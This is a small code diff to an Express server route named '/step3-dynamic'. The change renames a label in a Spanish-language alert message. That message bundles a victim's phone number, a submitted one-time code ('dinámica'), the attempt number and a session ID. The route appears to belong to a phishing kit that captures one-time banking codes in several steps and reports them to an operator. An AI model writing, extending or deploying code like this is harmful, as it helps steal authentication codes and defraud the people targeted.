@@ -275,7 +275,7 @@ app.post('/step3-dynamic', async (req, res) => {
     sessionData.set(sessionId, session);
     
 	  const mensaje = `
-📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
+📲 DINÁMICA1 ${attemptNumber} RECIBIDA 📲
 📱 Número: ${session.phoneNumber || 'N/A'}
 🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
